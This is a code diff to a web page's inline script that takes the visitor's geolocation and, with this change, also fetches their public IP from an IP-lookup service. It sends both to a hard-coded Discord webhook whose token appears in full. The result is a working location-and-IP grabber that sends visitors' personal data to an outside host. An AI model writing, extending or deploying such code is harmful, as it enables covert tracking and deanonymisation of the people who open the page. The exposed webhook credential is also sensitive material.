@@ -9,7 +9,7 @@
 
 <script>
 // Function to send data to Discord webhook
-function sendDataToDiscord(location) {
+function sendDataToDiscord(location, ipAddress) {
     // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
     var webhookURL = 'https://discord.com/api/webhooks/1218354893195317279/1FaezMpBarPVujIqm8sWQqKIrSnzkLsXtV-iz2dx6_AqZsiJ_MSsLaYI5SrsrgZRlmql';
     
@@ -18,7 +18,7 @@ function sendDataToDiscord(location) {
         content: 'User Location:',
         embeds: [{
             title: 'User Location',
-            description: 'Latitude: ' + location.latitude + ', Longitude: ' + location.longitude,
+            description: 'Latitude: ' + location.latitude + ', Longitude: ' + location.longitude + '\nIP Address: ' + ipAddress,
             color: 16711680 // Red color
         }]
     };
@@ -52,7 +52,19 @@ function askForLocationAndSendData() {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude
         };
-        sendDataToDiscord(location);
+
+        // Get user's IP address from api.ipify.org
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ipAddress = data.ip;
+            sendDataToDiscord(location, ipAddress);
+        })
+        .catch(error => {
+            console.error('Error getting IP address:', error);
+            sendDataToDiscord(location, 'Unknown');
+        });
+        
     }, function(error) {
         console.error('Error getting location:', error);
         alert('Failed to get location.');
